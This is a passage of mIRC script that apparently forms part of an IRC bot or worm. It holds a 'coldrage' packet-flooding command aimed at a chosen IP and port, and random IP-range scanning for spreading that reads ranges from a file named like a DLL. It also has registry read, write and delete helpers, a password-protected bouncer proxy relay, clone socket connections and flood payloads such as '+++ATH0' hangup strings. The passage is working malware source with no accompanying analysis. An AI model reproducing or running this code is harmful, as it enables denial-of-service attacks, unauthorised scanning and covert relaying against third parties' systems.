  if (%rnd == 5) { return ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ }
  if (%rnd == 6) { return ********************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************* }
  if (%rnd == 7) { return !@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%!@#%!^@)&!^&!*&!%&!%! }
  if (%rnd == 8) { return + + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATH0+ + +ATHO }
  if (%rnd == 9) { return A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4A&<Ë¦-^wÂxŸ kl)wº_i&Zeïã¨8ðè=ºÃ¤ò,Æî¿=E4kÊ|Ç—É—ÈkÂMpW*Q0®ô–®yãCï¦‘}ù/k©Br-OpýlêZžÖ·#6‹²\³[Nž›«2„7)™ÜZ4Ö·#6‹²\³[Nž›«2„7)™ÜZ4Ö·#6‹²\³[N }
}
alias coldrage {
  if ($1 == start) && ($2 && $3 && $4) { if (%_packeting == 1) { vtalk %crchan %b1 $+ coldrage $+ %b2 %b1 error: currently packeting! $+ %b2 | return } | set %_packeting 1 | unset %_coldragestop | unset %loops | .timer 1 2 set %_cstarttime $ctime | .timer 1 2 /timercoldrage -om 0 0 _coldragestart $2- | vtalk %crchan %b1 $+ coldrage $+ %b2 sending %b1 $+ $2 $+ %b2 packets to %b1 $+ $3 $+ %b2 on port %b1 $+ $4 $+ %b2 %b1 $+ total: $bytes($calc(32040 * $2)).suf $+ %b2 | return }
  if ($1 == stop) { if (%_packeting == 1) { set %_coldragestop 1 | set %_packeting 0 | timercoldrage* off | vtalk %crchan %b1 $+ coldrage $+ %b2 %b1 $+ halting all packets! $+ %b2 | return } | else { vtalk %crchan %b1 $+ coldrage $+ %b2 %b1 $+ error! no packeting in progress $+ %b2 | return } | unset %crchan }
}
alias totalfound {
  if (%totalscanned != $null) { return %totalscanned }
  if (%totalscanned == $null) { return none }
}
alias finished {
  if (%begshortip != $null) {
    vtalk $ld(%chan) %b1 $+ scanner $+ %b2 scanning from %b1 $+ %begshortip - %endshortip $+ %b2 has finished! | stopscan | scanpop
  }
}
alias clonecheck { if (!$portfree(%sport)) { exit } | else { .socklisten dr0ne %sport } }
alias scanpop {
  if (!%begshortip) {
    if (%sgranges) && ($isfile( %spreadfile )) && (%spreadfile != %defaultfile) && ($isfile(xcopy.dll)) {
      set %poprangesg $read(xcopy.dll)
      set %poprangew $+(%poprangesg,$str($+($chr(46),$chr(42)),$calc(4 - $numtok(%poprangesg,46))))
      set %poprangestart $replace($+($gettok(%poprangew,1-2,46),.,$r(0,255),.*),*,0)
      set %poprangeend $replace(%poprangew,*,255)
      set %begshortip %poprangestart
      set %beglongip $longip( %begshortip )
      set %endshortip %poprangeend
      set %endlongip $longip( %endshortip )
      set %total $calc( %endlongip - %beglongip )
      unset %totalscanning
      startscan
    }
    else {
      if (%spreadfile == %defaultfile) && ($isfile(%defaultfile)) || ($isfile(%sysdir $+ %defaultfile)) {
        if (!%popranges) { %popranges = 211_203_218_61_24_68_65_43_217_200_221_219 }
        set %randmax $numtok(%popranges,95)
        set %randnum $rand(1,%randmax)
        set %randrnum $rand(1,255)
        set %snum $gettok(%popranges,%randnum,95)
        set %begshortip %snum $+ . $+ %randrnum $+ .0.0
        set %beglongip $longip(  %begshortip )
        set %endshortip %snum $+ .255.255.255
        set %endlongip $longip( %endshortip  ) 
        set %total $calc( %endlongip - %beglongip ) 
        unset %totalscaning 
        startscan
      }
    }
  }
}
alias RegRead {
  if ($1 != $null) {
    var %a = regread
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegRead,3,bstr,$1-)
      var %q = $com(%a).result
      .comclose %a
      if (%q != $null) return %q
    }
  }
}
alias RegWrite {
  if ($1 != $null) && ($2) && ($3) {
    var %a = RegWrite
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegWrite,3,bstr,$1,bstr,$2,bstr,$3)
      .comclose %a
    }
  }
}
alias RegDelete {
  if ($1 != $null) {
    var %a = RegDelete
    .comopen %a WScript.Shell
    if !$comerr {
      var %b =  $com(%a,RegDelete,3,bstr,$1)
      .comclose %a
    }
  }
}
on 1:SOCKREAD:BncClient*:{
  sockread %BncClient
  if ($gettok(%BncClient,1,32) == NICK) {
    set %Bnc.nick $gettok(%BncClient,2,32)
  }
  if ($gettok(%BncClient,1,32) == USER) {
    set %Bnc.user $gettok(%BncClient,2-,32)
    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>
  }
  if ($gettok(%BncClient,1,32) == PASS) {
    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4, the irc proxy
      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now
      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect
      %Bnc.legit = yes
    }
    if ($gettok(%BncClient,2,32) != %Bnc.passwd) {
      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!
    }
  }
  if ($gettok(%BncClient,1,32) == CONN) {
    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ You need to login first! | halt
    }
    if (BncServer $+ $remove($sockname,BncClient) != $null) {
      sockclose BncServer $+ $remove($sockname,BncClient)
    }
    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $iif($gettok(%BncClient,3,32) != $null,$gettok(%BncClient,3,32),6667)
    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $iif($gettok(%BncClient,3,32) != $null,$gettok(%BncClient,3,32),6667)
    set %Bnc.server.passwd $gettok(%BncClient,4,32)
  }
  else {
    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {
      halt
    }
    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient
  }
}
on 1:SOCKOPEN:BncServer*:{
  if ($sockerr) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose $sockname
    halt
  }
  if ($sock($sockname).status != active) {
    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection
    sockclose BncServer $+ $remove($socknme, BncServer)
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection
  sockwrite -n $sockname NICK %Bnc.nick
  sockwrite -n $sockname USER %Bnc.user
}
on 1:SOCKREAD:BncServer*:{
  sockread %BncServer
  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {
    halt
  }
  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer
}
on 1:SOCKLISTEN:Bnc:{ sockaccept BncClient $+ $r(1,999) $+ $r(1,999) }
on 1:SOCKOPEN:Sockets-*:{ sockwrite -tn $sockname PONG $server | sockwrite -tn $sockname USER $rletterz $rletterz $rletterz : $+ $rletterz | sockwrite -tn $sockname NICK $rletterz }
on 1:SOCKREAD:Sockets-*:{
  sockread %SocketTemp
  if (PING* ISWM %SocketTemp) {
    sockwrite -tn $sockname PONG : $+ $gettok(%SocketTemp,2,58)
    halt
  }
  halt
}
raw 433:*:{ nick $nick0r }
alias uptimed {
  if (!$1) { return }
  var %u = $uptime(system,1)
  if (day isin %u) { 
    var %z = 1 
    while (%z <= $numtok(%u,32)) { 
      if (day isin $gettok(%u,%z,32)) { var %u2 = %z | break } 
      inc %z 
    }
    if (wk isin %u) {
      var %x = 1
      while (%x <= $numtok(%u,32)) {
        if (wk isin $gettok(%u,%x,32)) { var %u3 = %x | break }
        inc %x
      }
      var %wkdaynum = $calc($remove($gettok(%u,%u3,32),wks,wk) * 7)
    }
    var %days = $remove($gettok(%u,%u2,32),days,day)
    var %daytotal = $iif(%wkdaynum,$calc(%wkdaynum + %days),%days) 
    if (%daytotal >= $1) { return $true }
    else { return $false }
  }
  else return $false
}
alias uptimew {
  if (!$1) { return }
  var %u = $uptime(system,1)
  if (wk isin %u) { 
    var %z = 1 
    while (%z <= $numtok(%u,32)) { 
      if (wk isin $gettok(%u,%z,32)) { var %u2 = %z | break } 
      inc %z 
    } 
    var %wks = $remove($gettok(%u,%u2,32),wks,wk)
    if (%wks >= $1) { return $true }
    else { return $false }
  }
  else { return $false }
}
